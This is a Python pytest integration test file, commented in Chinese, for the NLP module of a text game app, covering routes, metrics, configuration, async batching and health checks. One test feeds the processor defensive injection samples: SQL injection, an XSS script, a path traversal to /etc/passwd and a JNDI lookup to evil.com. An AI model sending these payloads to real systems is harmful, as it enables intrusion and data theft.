"""
集成测试套件
测试 NLP 模块与其他系统组件的集成
"""

import pytest
import json
import os
import sys
import tempfile
from pathlib import Path
from typing import Dict, Any
from unittest.mock import Mock, patch
import asyncio

# 添加项目路径
PROJECT_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(PROJECT_ROOT / "src"))

# 配置测试环境
os.environ['USE_MOCK_LLM'] = 'true'
os.environ['ENABLE_PROMETHEUS'] = 'true'
os.environ['ENABLE_CONTEXT_COMPRESSION'] = 'true'


class TestNLPIntegration:
    """NLP 集成测试"""
    
    @pytest.fixture
    def app(self):
        """创建测试应用"""
        from app import create_app
        app = create_app()
        app.config['TESTING'] = True
        app.config['WTF_CSRF_ENABLED'] = False
        return app
    
    @pytest.fixture
    def client(self, app):
        """创建测试客户端"""
        return app.test_client()
    
    @pytest.fixture
    def nlp_processor(self):
        """创建 NLP 处理器"""
        from xwe.core.nlp.nlp_processor import NLPProcessor
        return NLPProcessor()
    
    def test_flask_routes_integration(self, client):
        """测试 Flask 路由集成"""
        # 1. 测试游戏命令路由
        response = client.post('/api/game/command', 
            json={'command': '探索周围环境'},
            headers={'Content-Type': 'application/json'}
        )
        
        assert response.status_code in [200, 404]  # 路由可能不存在
        
        if response.status_code == 200:
            data = response.json
            assert isinstance(data, dict)
        
        # 2. 测试状态路由
        response = client.get('/api/game/status')
        assert response.status_code in [200, 404]
        
        # 3. 测试指标路由
        response = client.get('/metrics')
        assert response.status_code == 200
        
        # 验证指标内容
        metrics_text = response.data.decode('utf-8')
        assert 'xwe_nlp_request_seconds' in metrics_text or 'flask_http_request_duration_seconds' in metrics_text
    
    def test_database_interaction(self):
        """测试数据库交互"""
        # 模拟数据库操作
        from xwe.core.nlp.nlp_processor import NLPProcessor
        
        # 创建临时数据库
        with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as tmp:
            db_path = tmp.name
        
        try:
            # 模拟保存和加载上下文
            processor = NLPProcessor()
            
            # 处理一些命令以生成上下文
            context = []
            for i in range(5):
                result = processor.process(f"测试命令 {i}", context)
                context.append({
                    'command': f"测试命令 {i}",
                    'result': result
                })
            
            # 保存上下文（模拟）
            context_data = json.dumps(context, ensure_ascii=False)
            with open(db_path, 'w', encoding='utf-8') as f:
                f.write(context_data)
            
            # 加载上下文（模拟）
            with open(db_path, 'r', encoding='utf-8') as f:
                loaded_context = json.loads(f.read())
            
            # 验证
            assert len(loaded_context) == len(context)
            assert loaded_context[0]['command'] == context[0]['command']
            
        finally:
            # 清理
            if os.path.exists(db_path):
                os.remove(db_path)
    
    def test_multi_module_coordination(self, app):
        """测试多模块协同"""
        with app.app_context():
            # 导入所需模块
            from xwe.core.nlp.nlp_processor import NLPProcessor
            from xwe.core.nlp.monitor import get_nlp_monitor
            from xwe.metrics.prometheus_metrics import get_metrics_collector
            
            # 创建组件
            processor = NLPProcessor()
            monitor = get_nlp_monitor()
            metrics_collector = get_metrics_collector()
            
            # 重置监控数据
            from xwe.core.nlp.monitor import reset_nlp_monitor
            reset_nlp_monitor()
            monitor = get_nlp_monitor()
            
            # 执行操作
            command = "测试多模块协同"
            result = processor.process(command)
            
            # 验证各模块都正确工作
            assert result is not None
            
            # 检查监控数据
            stats = monitor.get_stats()
            assert stats['total_requests'] >= 1
            
            # 检查 Prometheus 指标（如果启用）
            if metrics_collector:
                # 指标应该已更新
                pass
    
    def test_configuration_switching(self):
        """测试配置切换"""
        configurations = [
            {
                'name': '最小配置',
                'env': {
                    'USE_MOCK_LLM': 'true',
                    'ENABLE_CONTEXT_COMPRESSION': 'false',
                    'ENABLE_PROMETHEUS': 'false'
                }
            },
            {
                'name': '标准配置',
                'env': {
                    'USE_MOCK_LLM': 'true',
                    'ENABLE_CONTEXT_COMPRESSION': 'true',
                    'ENABLE_PROMETHEUS': 'false'
                }
            },
            {
                'name': '完整配置',
                'env': {
                    'USE_MOCK_LLM': 'true',
                    'ENABLE_CONTEXT_COMPRESSION': 'true',
                    'ENABLE_PROMETHEUS': 'true'
                }
            }
        ]
        
        for config in configurations:
            print(f"\n测试配置: {config['name']}")
            
            # 应用配置
            for key, value in config['env'].items():
                os.environ[key] = value
            
            # 创建新的处理器
            from xwe.core.nlp.nlp_processor import NLPProcessor
            processor = NLPProcessor()
            
            # 测试基本功能
            result = processor.process("配置测试命令")
            assert result is not None
            assert 'normalized_command' in result
            
            # 验证配置生效
            if config['env']['ENABLE_CONTEXT_COMPRESSION'] == 'true':
                assert hasattr(processor, 'context_compressor')
                if processor.context_compressor:
                    assert processor.context_compressor is not None
    
    @pytest.mark.asyncio
    async def test_async_integration(self):
        """测试异步集成"""
        from xwe.core.nlp.llm_client import LLMClient
        from xwe.core.nlp.async_utils import AsyncBatchProcessor
        
        # 创建客户端
        client = LLMClient()
        
        # 创建批处理器
        batch_processor = AsyncBatchProcessor(
            process_func=client.chat_async,
            batch_size=5,
            timeout=10.0
        )
        
        # 准备测试数据
        test_prompts = [f"异步测试 {i}" for i in range(10)]
        
        # 处理批次
        results = []
        for prompt in test_prompts:
            result = await batch_processor.add_request(prompt)
            results.append(result)
        
        # 等待所有结果
        await batch_processor.flush()
        
        # 验证结果
        assert len(results) == len(test_prompts)
        
        # 清理
        client.cleanup()
        await batch_processor.close()
    
    def test_error_propagation(self, nlp_processor):
        """测试错误传播"""
        # 1. 测试空输入错误
        result = nlp_processor.process("")
        assert result is not None
        assert result.get('intent') == 'unknown' or 'error' in result
        
        # 2. 测试超长输入错误
        long_input = "x" * 100000
        result = nlp_processor.process(long_input)
        assert result is not None
        
        # 3. 测试特殊字符输入
        special_input = "�������"
        result = nlp_processor.process(special_input)
        assert result is not None
        
        # 4. 测试注入攻击防护
        injection_attempts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for attempt in injection_attempts:
            result = nlp_processor.process(attempt)
            assert result is not None
            # 确保没有执行危险操作
    
    def test_monitoring_integration(self):
        """测试监控集成"""
        from xwe.core.nlp.monitor import get_nlp_monitor, reset_nlp_monitor
        from xwe.metrics.prometheus_metrics import get_metrics_collector
        
        # 重置监控
        reset_nlp_monitor()
        monitor = get_nlp_monitor()
        metrics_collector = get_metrics_collector()
        
        # 执行一些操作
        from xwe.core.nlp.nlp_processor import NLPProcessor
        processor = NLPProcessor()
        
        commands = ["命令1", "命令2", "命令3"]
        for cmd in commands:
            processor.process(cmd)
        
        # 检查监控数据
        stats = monitor.get_stats()
        assert stats['total_requests'] == len(commands)
        assert stats['success_rate'] > 0
        
        # 检查性能报告
        report = monitor.get_performance_report()
        assert "总请求数" in report
        assert str(len(commands)) in report
    
    def test_graceful_shutdown(self, app):
        """测试优雅关闭"""
        with app.app_context():
            from xwe.core.nlp.llm_client import LLMClient
            from xwe.core.nlp.async_utils import AsyncRequestQueue
            
            # 创建组件
            client = LLMClient()
            queue = AsyncRequestQueue(max_size=100)
            
            # 添加一些待处理请求
            for i in range(10):
                queue.put(f"shutdown_test_{i}")
            
            # 验证队列不为空
            assert queue.qsize() > 0
            
            # 执行优雅关闭
            client.cleanup()
            queue.close()
            
            # 验证资源已释放
            assert queue._closed == True
    
    def test_health_checks(self, client):
        """测试健康检查"""
        # 1. 基本健康检查
        response = client.get('/health')
        if response.status_code == 200:
            data = response.json
            assert 'status' in data or 'healthy' in data
        
        # 2. 详细健康检查
        response = client.get('/health/detailed')
        if response.status_code == 200:
            data = response.json
            # 可能包含各组件的健康状态
        
        # 3. 就绪检查
        response = client.get('/ready')
        if response.status_code == 200:
            # 系统已就绪
            pass


class TestAPIIntegration:
    """API 集成测试"""
    
    @pytest.fixture
    def api_client(self, app):
        """创建 API 测试客户端"""
        return app.test_client()
    
    def test_rest_api_workflow(self, api_client):
        """测试 REST API 工作流"""
        # 1. 创建会话
        response = api_client.post('/api/v1/session', json={
            'user_id': 'test_user_123'
        })
        
        if response.status_code == 200:
            session_data = response.json
            session_id = session_data.get('session_id')
            
            # 2. 发送命令
            response = api_client.post('/api/v1/command', json={
                'session_id': session_id,
                'command': '开始游戏'
            })
            
            if response.status_code == 200:
                command_result = response.json
                assert 'result' in command_result
            
            # 3. 获取状态
            response = api_client.get(f'/api/v1/session/{session_id}/status')
            
            if response.status_code == 200:
                status_data = response.json
                assert 'status' in status_data
    
    def test_websocket_integration(self):
        """测试 WebSocket 集成（如果支持）"""
        # 这里可以使用 pytest-asyncio 和 websockets 库进行测试
        pass
    
    def test_graphql_integration(self):
        """测试 GraphQL 集成（如果支持）"""
        # 这里可以测试 GraphQL 端点
        pass


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
